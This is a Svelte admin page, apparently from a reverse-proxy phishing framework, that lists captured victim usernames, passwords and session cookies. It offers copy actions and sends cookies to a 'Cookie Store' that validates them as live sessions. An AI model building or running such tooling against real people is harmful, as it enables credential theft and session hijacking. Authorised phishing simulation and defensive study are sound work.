<script>
	import { api } from '$lib/api/apiProxy.js';
	import { onMount } from 'svelte';
	import { addToast } from '$lib/store/toast';
	import HeadTitle from '$lib/components/HeadTitle.svelte';
	import Table from '$lib/components/table/Table.svelte';
	import TableRow from '$lib/components/table/TableRow.svelte';
	import TableCell from '$lib/components/table/TableCell.svelte';
	import TableCellEmpty from '$lib/components/table/TableCellEmpty.svelte';
	import TableCellAction from '$lib/components/table/TableCellAction.svelte';
	import TableDeleteButton from '$lib/components/table/TableDeleteButton2.svelte';
	import Headline from '$lib/components/Headline.svelte';
	import { newTableURLParams } from '$lib/service/tableURLParams';
	import TableDropDownEllipsis from '$lib/components/table/TableDropDownEllipsis.svelte';
	import DeleteAlert from '$lib/components/modal/DeleteAlert.svelte';
	import BigButton from '$lib/components/BigButton.svelte';
	import { showIsLoading, hideIsLoading } from '$lib/store/loading';

	// local state
	let captures = [];
	let capturesHasNextPage = false;
	const tableURLParams = newTableURLParams();
	let isTableLoading = false;
	let isDeleteAlertVisible = false;
	let isDeleteAllAlertVisible = false;
	let deleteValues = { id: null, ip: null };
	let expandedRow = null;

	// Filter state
	let activeFilter = 'all'; // 'all', 'credentials', 'cookies'

	const refreshCaptures = async () => {
		try {
			isTableLoading = true;
			const params = new URLSearchParams({
				page: tableURLParams.currentPage,
				perPage: tableURLParams.perPage,
				sortBy: tableURLParams.sortBy || 'created_at',
				sortOrder: tableURLParams.sortOrder || 'desc',
				search: tableURLParams.search || '',
				filter: activeFilter
			});
			const res = await api.proxyCaptures.getAll(params.toString());
			if (res.success) {
				captures = res.data.rows || [];
				capturesHasNextPage = res.data.hasNextPage || false;
				return;
			}
			throw res.error;
		} catch (e) {
			addToast('Failed to load proxy captures', 'Error');
			console.error('failed to load proxy captures', e);
		} finally {
			isTableLoading = false;
		}
	};

	const setFilter = (filter) => {
		activeFilter = filter;
		tableURLParams.currentPage = 1;
		refreshCaptures();
	};

	onMount(() => {
		refreshCaptures();
		tableURLParams.onChange(refreshCaptures);
		return () => {
			tableURLParams.unsubscribe();
		};
	});

	const openDeleteAlert = (capture) => {
		isDeleteAlertVisible = true;
		deleteValues.id = capture.ID;
		deleteValues.ip = capture.IPAddress;
	};

	const openDeleteAllAlert = () => {
		isDeleteAllAlertVisible = true;
	};

	const deleteCapture = async (id) => {
		const action = api.proxyCaptures.deleteByID(id);
		action
			.then((res) => {
				if (res.success) {
					refreshCaptures();
					return;
				}
				throw res.error;
			})
			.catch((e) => {
				addToast('Failed to delete capture', 'Error');
				console.error('failed to delete capture', e);
			});
		return action;
	};

	const deleteAllCaptures = async () => {
		const action = api.proxyCaptures.deleteAll();
		action
			.then((res) => {
				if (res.success) {
					refreshCaptures();
					return;
				}
				throw res.error;
			})
			.catch((e) => {
				addToast('Failed to delete all captures', 'Error');
				console.error('failed to delete all captures', e);
			});
		return action;
	};

	const toggleExpand = (id) => {
		expandedRow = expandedRow === id ? null : id;
	};

	const formatDate = (dateStr) => {
		if (!dateStr) return '';
		const d = new Date(dateStr);
		return d.toLocaleString();
	};

	const maskPassword = (pw) => {
		if (!pw) return '';
		if (pw.length <= 4) return '****';
		return pw.substring(0, 2) + '****' + pw.substring(pw.length - 2);
	};

	let showPasswords = {};
	const togglePassword = (id) => {
		showPasswords[id] = !showPasswords[id];
		showPasswords = showPasswords;
	};

	const copyToClipboard = (text) => {
		navigator.clipboard.writeText(text).then(() => {
			addToast('Copied to clipboard', 'Success');
		}).catch(() => {
			addToast('Failed to copy', 'Error');
		});
	};

	const sendToCookieStore = async (capture) => {
		if (!capture.Cookies) {
			addToast('No cookies to send', 'Error');
			return;
		}
		const name = capture.Username
			? `Proxy: ${capture.Username}`
			: `Proxy: ${capture.IPAddress || 'Unknown'}`;
		showIsLoading();
		try {
			const res = await api.cookieStore.importFromCapture(
				capture.ID,
				name,
				capture.Cookies
			);
			if (res.success) {
				addToast('Cookies sent to Cookie Store. Validating session...', 'Success');
			} else {
				throw res.error;
			}
		} catch (e) {
			addToast('Failed to send to Cookie Store: ' + (e || ''), 'Error');
			console.error('failed to send to cookie store', e);
		} finally {
			hideIsLoading();
		}
	};
</script>

<HeadTitle title="Proxy Captures" />

<main>
	<Headline>Proxy Captures</Headline>
	<p style="margin-bottom: 1rem; opacity: 0.7;">
		Credentials and cookies captured from direct proxy visits (without a campaign link).
	</p>

	<div class="controls-row">
		<div class="filter-group">
			<button
				class="filter-btn"
				class:active={activeFilter === 'all'}
				on:click={() => setFilter('all')}
			>
				All
			</button>
			<button
				class="filter-btn"
				class:active={activeFilter === 'credentials'}
				on:click={() => setFilter('credentials')}
			>
				With Credentials
			</button>
			<button
				class="filter-btn"
				class:active={activeFilter === 'cookies'}
				on:click={() => setFilter('cookies')}
			>
				Cookies Only
			</button>
		</div>
		<BigButton on:click={openDeleteAllAlert}>Delete all captures</BigButton>
	</div>

	<Table
		columns={[
			{ column: 'Time', size: 'small' },
			{ column: 'IP Address', size: 'small' },
			{ column: 'Username', size: 'medium' },
			{ column: 'Password', size: 'small' },
			{ column: 'Cookies', size: 'small' },
			{ column: 'Domain', size: 'small' }
		]}
		sortable={['Time', 'IP Address', 'Username']}
		hasData={!!captures.length}
		hasNextPage={capturesHasNextPage}
		plural="Captures"
		pagination={tableURLParams}
		isGhost={isTableLoading}
	>
		{#each captures as capture}
			<TableRow>
				<TableCell value={formatDate(capture.CreatedAt)} />
				<TableCell value={capture.IPAddress || ''} />
				<TableCell>
					{#if capture.Username}
						<span class="credential-badge">{capture.Username}</span>
					{:else}
						<span>-</span>
					{/if}
				</TableCell>
				<TableCell>
					{#if capture.Password}
						<span style="display: flex; align-items: center; gap: 0.5rem;">
							<code>{showPasswords[capture.ID] ? capture.Password : maskPassword(capture.Password)}</code>
							<button
								class="small-btn"
								on:click|stopPropagation={() => togglePassword(capture.ID)}
								title={showPasswords[capture.ID] ? 'Hide' : 'Show'}
							>
								{showPasswords[capture.ID] ? 'Hide' : 'Show'}
							</button>
							<button
								class="small-btn"
								on:click|stopPropagation={() => copyToClipboard(capture.Password)}
								title="Copy"
							>
								Copy
							</button>
						</span>
					{:else}
						<span>-</span>
					{/if}
				</TableCell>
				<TableCell>
				{#if capture.Cookies}
					<span style="display: flex; align-items: center; gap: 0.5rem;">
						<span class="cookie-badge">
							{(() => {
								try {
									const parsed = JSON.parse(capture.Cookies);
									if (Array.isArray(parsed)) return parsed.length + ' cookies';
									return 'Captured';
								} catch {
									return 'Captured';
								}
							})()}
						</span>
						<button
							class="small-btn"
							on:click|stopPropagation={() => copyToClipboard(capture.Cookies)}
							title="Copy cookies"
						>
							Copy
						</button>
					</span>
				{:else}
					<span>-</span>
				{/if}
				</TableCell>
				<TableCell value={capture.TargetDomain || capture.PhishDomain || ''} />
				<TableCellEmpty />
				<TableCellAction>
					<TableDropDownEllipsis>
						<button class="dropdown-item" on:click={() => toggleExpand(capture.ID)}>
							{expandedRow === capture.ID ? 'Collapse' : 'Details'}
						</button>
						{#if capture.Cookies}
							<button class="dropdown-item" on:click={() => copyToClipboard(capture.Cookies)}>
								Copy Cookies
							</button>
						{/if}
						{#if capture.CapturedData}
							<button class="dropdown-item" on:click={() => copyToClipboard(capture.CapturedData)}>
								Copy All Data
							</button>
						{/if}
						{#if capture.Cookies}
							<button class="dropdown-item" on:click={() => sendToCookieStore(capture)}>
								Send to Cookie Store
							</button>
						{/if}
						<TableDeleteButton on:click={() => openDeleteAlert(capture)} />
					</TableDropDownEllipsis>
				</TableCellAction>
			</TableRow>

			{#if expandedRow === capture.ID}
				<tr class="expanded-row">
					<td colspan="8">
						<div class="capture-details">
							<div class="detail-grid">
								<div class="detail-item">
									<span class="detail-label">Session ID</span>
									<span class="detail-value"><code>{capture.SessionID || '-'}</code></span>
								</div>
								<div class="detail-item">
									<span class="detail-label">User Agent</span>
									<span class="detail-value" style="word-break: break-all;">{capture.UserAgent || '-'}</span>
								</div>
								<div class="detail-item">
									<span class="detail-label">Phish Domain</span>
									<span class="detail-value"><code>{capture.PhishDomain || '-'}</code></span>
								</div>
								<div class="detail-item">
									<span class="detail-label">Target Domain</span>
									<span class="detail-value"><code>{capture.TargetDomain || '-'}</code></span>
								</div>
							{#if capture.Cookies}
								<div class="detail-item full-width">
									<span class="detail-label">Cookies</span>
									<pre class="detail-pre">{(() => {
										try {
											return JSON.stringify(JSON.parse(capture.Cookies), null, 2);
										} catch {
											return capture.Cookies;
										}
									})()}</pre>
								</div>
							{/if}
								{#if capture.CapturedData}
									<div class="detail-item full-width">
										<span class="detail-label">All Captured Data</span>
										<pre class="detail-pre">{(() => {
											try {
												return JSON.stringify(JSON.parse(capture.CapturedData), null, 2);
											} catch {
												return capture.CapturedData;
											}
										})()}</pre>
									</div>
								{/if}
							</div>
						</div>
					</td>
				</tr>
			{/if}
		{/each}
	</Table>

	<DeleteAlert
		list={[]}
		name={deleteValues.ip}
		onClick={() => deleteCapture(deleteValues.id)}
		bind:isVisible={isDeleteAlertVisible}
	/>
	<DeleteAlert
		list={[]}
		name={'all proxy captures'}
		onClick={() => deleteAllCaptures()}
		bind:isVisible={isDeleteAllAlertVisible}
	/>
</main>

<style>
	.controls-row {
		display: flex;
		align-items: center;
		justify-content: space-between;
		gap: 1rem;
		margin-bottom: 1rem;
		flex-wrap: wrap;
	}
	.filter-group {
		display: flex;
		gap: 0;
		border-radius: 8px;
		overflow: hidden;
		border: 1px solid var(--border-color, #ccc);
	}
	.filter-btn {
		padding: 0.5rem 1rem;
		font-size: 0.85rem;
		font-weight: 500;
		border: none;
		background: var(--bg-secondary, #f5f5f5);
		color: var(--text-primary, #333);
		cursor: pointer;
		transition: all 0.2s ease;
		border-right: 1px solid var(--border-color, #ccc);
	}
	.filter-btn:last-child {
		border-right: none;
	}
	.filter-btn:hover {
		background: var(--bg-hover, #e0e0e0);
	}
	.filter-btn.active {
		background: var(--primary-color, #4f46e5);
		color: white;
	}
	.credential-badge {
		display: inline-flex;
		align-items: center;
		padding: 2px 8px;
		font-size: 0.8rem;
		font-weight: 600;
		border-radius: 4px;
		background: #10b98120;
		color: #059669;
		border: 1px solid #10b98140;
	}
	.small-btn {
		padding: 2px 8px;
		font-size: 0.75rem;
		border: 1px solid var(--border-color, #ccc);
		border-radius: 4px;
		background: var(--bg-secondary, #f5f5f5);
		color: var(--text-primary, #333);
		cursor: pointer;
		white-space: nowrap;
	}
	.small-btn:hover {
		background: var(--bg-hover, #e0e0e0);
	}
	.expanded-row td {
		padding: 1rem 1.5rem;
		background: var(--bg-secondary, #f9f9f9);
		border-bottom: 1px solid var(--border-color, #e0e0e0);
	}
	.capture-details {
		max-width: 100%;
	}
	.detail-grid {
		display: grid;
		grid-template-columns: 1fr 1fr;
		gap: 0.75rem;
	}
	.detail-item {
		display: flex;
		flex-direction: column;
		gap: 0.25rem;
	}
	.detail-item.full-width {
		grid-column: 1 / -1;
	}
	.detail-label {
		font-weight: 600;
		font-size: 0.8rem;
		opacity: 0.7;
		text-transform: uppercase;
		letter-spacing: 0.05em;
	}
	.detail-value {
		font-size: 0.9rem;
	}
	.detail-pre {
		background: var(--bg-code, #1e1e1e);
		color: var(--text-code, #d4d4d4);
		padding: 0.75rem;
		border-radius: 6px;
		font-size: 0.8rem;
		overflow-x: auto;
		max-height: 200px;
		white-space: pre-wrap;
		word-break: break-all;
	}
	.dropdown-item {
		display: block;
		width: 100%;
		padding: 0.5rem 1rem;
		text-align: left;
		border: none;
		background: none;
		cursor: pointer;
		font-size: 0.875rem;
		color: var(--text-primary, #333);
	}
	.dropdown-item:hover {
		background: var(--bg-hover, #f0f0f0);
	}
	.cookie-badge {
		display: inline-flex;
		align-items: center;
		padding: 2px 8px;
		font-size: 0.7rem;
		font-weight: 600;
		text-transform: uppercase;
		letter-spacing: 0.05em;
		border-radius: 9999px;
		background: #f59e0b20;
		color: #d97706;
		border: 1px solid #f59e0b40;
	}
</style>
